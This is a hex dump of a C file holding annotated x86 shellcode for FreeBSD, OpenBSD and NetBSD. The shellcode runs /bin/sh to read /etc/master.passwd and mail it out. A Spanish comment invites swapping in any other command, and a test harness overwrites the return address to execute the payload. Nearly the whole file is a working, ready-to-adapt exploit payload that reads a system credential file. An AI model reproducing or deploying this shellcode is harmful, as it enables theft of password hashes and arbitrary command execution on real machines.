00000000  2f 2a 0d 0a 20 20 20 2a  42 53 44 20 76 65 72 73  |/*..   *BSD vers|
00000010  69 6f 6e 0d 0a 20 20 20  46 72 65 65 42 53 44 2c  |ion..   FreeBSD,|
00000020  20 4f 70 65 6e 42 53 44  2c 20 4e 65 74 42 53 44  | OpenBSD, NetBSD|
00000030  2e 0d 0a 0d 0a 20 20 20  73 30 74 34 69 70 76 36  |.....   s0t4ipv6|
00000040  40 73 68 65 6c 6c 63 6f  64 65 2e 63 6f 6d 2e 61  |@shellcode.com.a|
00000050  72 0d 0a 0d 0a 20 20 20  39 32 20 62 79 74 65 73  |r....   92 bytes|
00000060  2e 0d 0a 0d 0a 20 20 20  5f 65 78 65 63 76 65 28  |.....   _execve(|
00000070  2f 62 69 6e 2f 73 68 20  2d 63 20 22 2f 62 69 6e  |/bin/sh -c "/bin|
00000080  2f 63 61 74 20 2f 65 74  63 2f 6d 61 73 74 65 72  |/cat /etc/master|
00000090  2e 70 61 73 73 77 64 7c  6d 61 69 6c 20 72 6f 6f  |.passwd|mail roo|
000000a0  74 40 6c 6f 63 61 6c 68  6f 73 74 22 29 3b 0d 0a  |t@localhost");..|
000000b0  20 20 20 70 75 65 64 65  6e 20 72 65 65 6d 70 6c  |   pueden reempl|
000000c0  7a 61 72 20 65 6c 20 63  6f 6d 61 6e 64 6f 20 70  |zar el comando p|
000000d0  6f 72 20 6c 6f 20 71 75  65 20 73 65 20 6c 65 73  |or lo que se les|
000000e0  20 6f 63 75 72 72 61 2e  0d 0a 2a 2f 0d 0a 0d 0a  | ocurra...*/....|
000000f0  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000100  3d 0d 0a 0d 0a 20 20 20  20 22 5c 78 65 62 5c 78  |=....    "\xeb\x|
00000110  32 35 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |25"             |
00000120  2f 2a 20 6a 6d 70 20 20  20 20 20 3c 5f 73 68 65  |/* jmp     <_she|
00000130  6c 6c 63 6f 64 65 2b 33  39 3e 20 20 20 20 20 20  |llcode+39>      |
00000140  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 35 39  |   */..    "\x59|
00000150  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000160  20 20 2f 2a 20 70 6f 70  6c 20 20 20 20 25 65 63  |  /* popl    %ec|
00000170  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
00000180  20 20 20 20 2a 2f 0d 0a  20 20 20 20 22 5c 78 33  |    */..    "\x3|
00000190  31 5c 78 63 30 22 20 20  20 20 20 20 20 20 20 20  |1\xc0"          |
000001a0  20 20 20 2f 2a 20 78 6f  72 6c 20 20 20 20 25 65  |   /* xorl    %e|
000001b0  61 78 2c 25 65 61 78 20  20 20 20 20 20 20 20 20  |ax,%eax         |
000001c0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
000001d0  35 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |50"             |
000001e0  20 20 20 20 2f 2a 20 70  75 73 68 6c 20 20 20 25  |    /* pushl   %|
000001f0  65 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |eax             |
00000200  20 20 20 20 20 20 2a 2f  0d 0a 20 20 20 20 22 5c  |      */..    "\|
00000210  78 36 38 5c 78 36 65 5c  78 32 66 5c 78 37 33 5c  |x68\x6e\x2f\x73\|
00000220  78 36 38 22 20 2f 2a 20  70 75 73 68 20 20 20 20  |x68" /* push    |
00000230  24 30 78 36 38 37 33 32  66 36 65 20 20 20 20 20  |$0x68732f6e     |
00000240  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 22  |       */..    "|
00000250  5c 78 36 38 5c 78 32 66  5c 78 32 66 5c 78 36 32  |\x68\x2f\x2f\x62|
00000260  5c 78 36 39 22 20 2f 2a  20 70 75 73 68 20 20 20  |\x69" /* push   |
00000270  20 24 30 78 36 39 36 32  32 66 32 66 20 20 20 20  | $0x69622f2f    |
00000280  20 20 20 20 20 20 20 20  2a 2f 0d 0a 20 20 20 20  |        */..    |
00000290  22 5c 78 38 39 5c 78 65  33 22 20 20 20 20 20 20  |"\x89\xe3"      |
000002a0  20 20 20 20 20 20 20 2f  2a 20 6d 6f 76 6c 20 20  |       /* movl  |
000002b0  20 20 25 65 73 70 2c 25  65 62 78 20 20 20 20 20  |  %esp,%ebx     |
000002c0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
000002d0  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
000002e0  20 20 20 20 20 20 20 20  2f 2a 20 70 75 73 68 6c  |        /* pushl|
000002f0  20 20 20 25 65 61 78 20  20 20 20 20 20 20 20 20  |   %eax         |
00000300  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 20 20  |          */..  |
00000310  20 20 22 5c 78 36 36 5c  78 36 38 5c 78 32 64 5c  |  "\x66\x68\x2d\|
00000320  78 36 33 22 20 20 20 20  20 2f 2a 20 70 75 73 68  |x63"     /* push|
00000330  77 20 20 20 24 30 78 36  33 32 64 20 20 20 20 20  |w   $0x632d     |
00000340  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |           */.. |
00000350  20 20 20 22 5c 78 38 39  5c 78 65 37 22 20 20 20  |   "\x89\xe7"   |
00000360  20 20 20 20 20 20 20 20  20 20 2f 2a 20 6d 6f 76  |          /* mov|
00000370  6c 20 20 20 20 25 65 73  70 2c 25 65 64 69 20 20  |l    %esp,%edi  |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
00000390  20 20 20 20 22 5c 78 35  30 22 20 20 20 20 20 20  |    "\x50"      |
000003a0  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 70 75  |           /* pu|
000003b0  73 68 6c 20 20 20 25 65  61 78 20 20 20 20 20 20  |shl   %eax      |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
000003d0  0a 20 20 20 20 22 5c 78  35 31 22 20 20 20 20 20  |.    "\x51"     |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 70  |            /* p|
000003f0  75 73 68 6c 20 20 20 25  65 63 78 20 20 20 20 20  |ushl   %ecx     |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
00000410  0d 0a 20 20 20 20 22 5c  78 35 37 22 20 20 20 20  |..    "\x57"    |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000430  70 75 73 68 6c 20 20 20  25 65 64 69 20 20 20 20  |pushl   %edi    |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |               *|
00000450  2f 0d 0a 20 20 20 20 22  5c 78 35 33 22 20 20 20  |/..    "\x53"   |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000470  20 70 75 73 68 6c 20 20  20 25 65 62 78 20 20 20  | pushl   %ebx   |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000490  2a 2f 0d 0a 20 20 20 20  22 5c 78 38 39 5c 78 65  |*/..    "\x89\xe|
000004a0  37 22 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |7"             /|
000004b0  2a 20 6d 6f 76 6c 20 20  20 20 25 65 73 70 2c 25  |* movl    %esp,%|
000004c0  65 64 69 20 20 20 20 20  20 20 20 20 20 20 20 20  |edi             |
000004d0  20 2a 2f 0d 0a 20 20 20  20 22 5c 78 35 30 22 20  | */..    "\x50" |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004f0  2f 2a 20 70 75 73 68 6c  20 20 20 25 65 61 78 20  |/* pushl   %eax |
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000510  20 20 2a 2f 0d 0a 20 20  20 20 22 5c 78 35 37 22  |  */..    "\x57"|
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000530  20 2f 2a 20 70 75 73 68  6c 20 20 20 25 65 64 69  | /* pushl   %edi|
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000550  20 20 20 2a 2f 0d 0a 20  20 20 20 22 5c 78 35 33  |   */..    "\x53|
00000560  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000570  20 20 2f 2a 20 70 75 73  68 6c 20 20 20 25 65 62  |  /* pushl   %eb|
00000580  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
00000590  20 20 20 20 2a 2f 0d 0a  20 20 20 20 22 5c 78 35  |    */..    "\x5|
000005a0  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
000005b0  20 20 20 2f 2a 20 70 75  73 68 6c 20 20 20 25 65  |   /* pushl   %e|
000005c0  61 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ax              |
000005d0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 22 5c 78  |     */..    "\x|
000005e0  62 30 5c 78 33 62 22 20  20 20 20 20 20 20 20 20  |b0\x3b"         |
000005f0  20 20 20 20 2f 2a 20 6d  6f 76 62 20 20 20 20 24  |    /* movb    $|
00000600  30 78 30 62 2c 25 61 6c  20 20 20 20 20 20 20 20  |0x0b,%al        |
00000610  20 20 20 20 20 20 2a 2f  0d 0a 20 20 20 20 22 5c  |      */..    "\|
00000620  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
00000630  20 20 20 20 20 2f 2a 20  69 6e 74 20 20 20 20 20  |     /* int     |
00000640  24 30 78 38 30 20 20 20  20 20 20 20 20 20 20 20  |$0x80           |
00000650  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 22  |       */..    "|
00000660  5c 78 65 38 5c 78 64 36  5c 78 66 66 5c 78 66 66  |\xe8\xd6\xff\xff|
00000670  5c 78 66 66 22 20 2f 2a  20 63 61 6c 6c 20 20 20  |\xff" /* call   |
00000680  20 3c 5f 73 68 65 6c 6c  63 6f 64 65 2b 32 3e 20  | <_shellcode+2> |
00000690  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
000006a0  20 22 2f 62 69 6e 2f 63  61 74 20 2f 65 74 63 2f  | "/bin/cat /etc/|
000006b0  6d 61 73 74 65 72 2e 70  61 73 73 77 64 7c 6d 61  |master.passwd|ma|
000006c0  69 6c 20 72 6f 6f 74 40  6c 6f 63 61 6c 68 6f 73  |il root@localhos|
000006d0  74 22 3b 0d 0a 0d 0a 6d  61 69 6e 28 29 0d 0a 7b  |t";....main()..{|
000006e0  0d 0a 20 20 20 69 6e 74  20 2a 72 65 74 3b 0d 0a  |..   int *ret;..|
000006f0  20 20 20 70 72 69 6e 74  66 28 22 53 68 65 6c 6c  |   printf("Shell|
00000700  63 6f 64 65 20 6c 65 6e  67 68 74 3d 25 64 5c 6e  |code lenght=%d\n|
00000710  22 2c 73 69 7a 65 6f 66  28 73 68 65 6c 6c 63 6f  |",sizeof(shellco|
00000720  64 65 29 29 3b 0d 0a 20  20 20 72 65 74 3d 28 69  |de));..   ret=(i|
00000730  6e 74 2a 29 26 72 65 74  2b 32 3b 0d 0a 20 20 20  |nt*)&ret+2;..   |
00000740  28 2a 72 65 74 29 3d 28  69 6e 74 29 73 68 65 6c  |(*ret)=(int)shel|
00000750  6c 63 6f 64 65 3b 0d 0a  7d                       |lcode;..}|
00000759
